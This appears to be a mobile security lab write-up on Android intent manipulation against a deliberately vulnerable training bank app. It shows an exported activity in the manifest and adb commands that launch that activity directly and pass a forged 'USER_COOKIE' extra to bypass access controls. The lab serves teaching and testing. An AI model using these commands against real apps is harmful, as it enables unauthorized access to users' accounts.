# Intent Manipulation 1 #
In this lab we will be using "Intents" to bypass access controls.

## What is an intent? ##
An "intent" is a "message object" typically used communicate between different activities in your application.

Sometimes however, intents can be sent between applications, or, in our example, from adb.

By analyzing the manifest file of our app, we noticed the following activity is exported.
```xml
<activity
    android:name=".AccountDetails"
    android:parentActivityName=".AccountViewMain"
    android:exported="true">
        <meta-data
            android:name="android.app.lib_name"
            android:value="" />
</activity>
```

## Invoking Intents from ADB ##
using the adb shell we can execute a specific activity within the app.

The below command executes the activity specifies after the -n option.

`adb shell am start -n com.bhis.supersecurebank/.{ACTIVITY NAME}`

The name of each activity present in the application can be found in the manifest file 

[screenshot]

`adb shell am start -n com.bhis.supersecurebank/.AccountDetails`

We can also pass data when starting intents with ADB. For example, running the below command results in a different result than running the command above.

`adb shell am start -n com.bhis.supersecurebank/.AccountDetails --es "USER_COOKIE" "nothinginparticular"`

[screenshot]

The command above requires us to know the name of the intent extra. These can be found by looking at the source code in a program such as jadx.

[screenshot]

